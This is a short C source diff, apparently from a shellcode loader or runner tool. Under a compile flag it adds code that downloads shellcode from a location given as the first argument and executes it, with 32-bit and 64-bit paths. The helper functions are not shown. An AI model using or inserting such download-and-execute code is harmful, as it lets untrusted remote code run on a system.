@@ -200,6 +200,16 @@ int main (int argc, char **argv)
 	}
 #endif
 
+#ifdef DOWNLOADEXECSC
+	unsigned char *shellcode = downloadshellcode(argv[1]);
+#ifndef X64
+	exec_shellcode(shellcode);
+#endif
+#ifdef X64
+	exec_shellcode64(shellcode);
+#endif
+#endif
+
 	return 0;
 }
 
